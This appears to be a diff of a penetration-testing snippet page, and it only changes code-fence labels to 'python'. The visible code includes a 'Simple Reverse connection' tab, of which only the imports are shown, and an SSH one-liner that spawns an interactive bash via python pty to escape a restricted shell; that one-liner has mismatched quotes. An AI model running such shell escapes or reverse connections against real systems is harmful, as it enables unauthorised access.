@@ -2,7 +2,7 @@
 
 {% tabs %}
 {% tab title="Simple Reverse connection" %}
-```
+```python
 import socket
 import subprocess
 
@@ -31,13 +31,13 @@ while True:
 {% endtab %}
 
 {% tab title="SSH login escape" %}
-```
+```python
 ssh user@host "python -c \"import pty; pty.spawn('/bin/bash")\""
 ```
 {% endtab %}
 
 {% tab title="Base64 Web image decoder" %}
-```
+```python
 # Save the data value to a text file (image.txt) and run the script below to generate an image. 
 
 #!/bin/python
@@ -58,7 +58,7 @@ img_file.close()
 {% endtab %}
 
 {% tab title="Password Generator" %}
-```
+```python
 # Random Password generator. Insert additional characters as desired
 
 import os
@@ -76,7 +76,7 @@ print(Index)
 {% endtab %}
 
 {% tab title="Redirect.py" %}
-```
+```python
 #!/usr/bin/python3
 import sys
 from http.server import HTTPServer, BaseHTTPRequestHandler
